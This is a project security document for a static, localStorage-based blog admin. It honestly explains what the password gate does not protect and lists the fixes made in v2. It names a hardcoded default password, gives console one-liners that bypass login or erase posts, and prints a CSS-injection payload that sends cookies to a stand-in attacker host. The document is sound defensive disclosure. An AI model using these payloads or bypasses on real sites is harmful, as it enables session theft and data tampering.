# SECURITY.md — Journal de Nabie

This is the honest version of what the admin protects against and what it doesn't,
plus what to do if you ever want it to actually be private.

## TL;DR

The "admin" in this project is a **password gate on a UI**, not a security
boundary. The site has no backend — everything (articles, messages, subscribers,
password, "logged in" flag) lives in **your browser's localStorage**. The login
screen is convenience, not protection.

This is the right architecture for a **portfolio piece**. It is the wrong
architecture for a real publishing tool with private drafts or subscriber data
you'd be embarrassed to leak.

## What "admin" protects against, today

- A casual visitor opening `admin.html` and clicking around. They hit a
  password gate and don't get past the login screen.
- Accidental edits by someone using your machine — they'd need the password
  to open the editor.
- After this v2 patch:
  - **Idle timeout**: after 1 hour with no activity, the session expires
    and the admin requires the password again.
  - **Brute-force throttling**: 5 wrong passwords triggers a 60-second
    lockout (per-browser).
  - **Constant-time-ish compare**: doesn't matter against a real attacker
    but it's good hygiene and avoids one class of timing side-channel.

## What it does NOT protect against

- **Anyone reading the source.** `DEFAULT_PWD = 'Nabie2026!'` is in
  `admin.html`. View source, ctrl-F, done. Once you've changed the password
  in Settings, the *new* value lives in `localStorage` in the visitor's
  browser — visible in DevTools → Application → Local Storage.
- **DevTools console.** Anyone with the page open can run
  `localStorage.setItem('nb_admin_cfg', JSON.stringify({loggedIn:true, loggedInAt:Date.now()}))`
  and refresh into the admin shell.
- **Direct data tampering.** Anyone on the same browser can run
  `localStorage.setItem('nb_blog_posts', '[]')` and erase your articles.
  No login required, because no backend means no enforcement.
- **Cross-device sync.** A "logged in" session on your phone is independent
  from your laptop. There's no real user account.
- **Bots scraping content.** Articles render server-side via static HTML;
  anyone can read them whether they're "published" or "drafts" if they
  inspect `localStorage` payloads. (In practice, since storage is per-browser,
  bots can't see your drafts — only the seeded public ones in the HTML.)
- **Subscribers' email addresses.** They sit in plaintext localStorage.
  If you ever ship this with a shared storage backend, that's a personal-data
  liability — GDPR territory if any subscriber is in the EU.

## Vulnerabilities that v2 *did* fix

- **CSS injection via `post.cover` URLs.** v1 built
  ``<div style="background-image:url('${escapeHtml((p.cover||'').replace(/'/g,"\\'"))}')">``
  — the `\'` replacement ran *before* `escapeHtml`, which then turned the
  quote into `&#39;`. The browser later HTML-decoded the attribute and
  read the bare `'` inside the CSS string, breaking out of `url(...)`
  into arbitrary CSS. A malicious cover URL like
  `'); background: url(https://evil.example/track?cookie='+document.cookie+')` (with
  the right shape) could exfiltrate or hijack styling. v2 builds the
  element with the DOM API and sets `element.style.backgroundImage`
  directly — the CSS engine handles the encoding.
- **Same bug in the article modal cover** — same fix.
- **`safeImageUrl` URL-scheme allowlist.** Cover URLs and the custom-logo
  URL are now whitelisted to `http(s):`, relative paths, and `data:image/*`.
  `javascript:`, `vbscript:`, `data:text/html`, etc. are rejected.
- **Session never expired in v1.** A login on a shared machine stayed
  open forever. Now it's 1 hour of idle.
- **No lockout.** v1 let you guess passwords as fast as you could click.
  Now 5 wrong guesses earns you a minute of timeout.

## If you ever want this to actually be private

You need three things, none of which a static page can do:

1. **A server endpoint that owns the password check.** The browser sends
   the typed password and gets back a session token (a signed cookie or a
   short-lived JWT). The password constant lives on the server, not the
   client. Options:
   - [Netlify Functions](https://docs.netlify.com/functions/overview/) +
     [Netlify Identity](https://docs.netlify.com/security/secure-access-to-sites/identity/)
     (built-in user accounts, free tier).
   - [Cloudflare Workers](https://workers.cloudflare.com/) +
     [Cloudflare Access](https://www.cloudflare.com/zero-trust/products/access/)
     for Zero-Trust-style email-OTP login.
   - [Supabase](https://supabase.com/) for full auth + a Postgres table
     for posts + Row-Level Security so visitors only read published ones.
   - Vercel + NextAuth, Firebase Auth, etc. — many options.

2. **A backend store for articles & messages.** Postgres, SQLite (on a
   real server), or a hosted database. The blog reads via a public API
   (only published rows); the admin reads/writes everything via an
   authenticated API.

3. **Migrate the existing localStorage data.** Build a one-off export →
   import script. With the data already in `nb_blog_posts` JSON shape,
   this is mechanical — a 50-line Node script that POSTs each row.

The migration is the hardest part. Once you have a backend, the admin
auth becomes a 10-line `fetch('/api/login', {body: pwd})` and everything
else falls into place.

## What to do today (without rewriting anything)

1. **Change the default password.** Settings → Mot de passe. The default
   `Nabie2026!` is in the source — change it the first time you open the
   admin. (You did this already if you've been using the site.)
2. **Don't store subscriber emails or message bodies you'd be embarrassed
   to leak.** They live in plaintext localStorage on whatever browser
   originally received them.
3. **Treat `admin.html` as "do not link from anywhere public."** It's
   already `noindex, nofollow` in the meta robots tag, so search engines
   won't find it on their own — but anyone who knows the URL can visit.

— *N.*
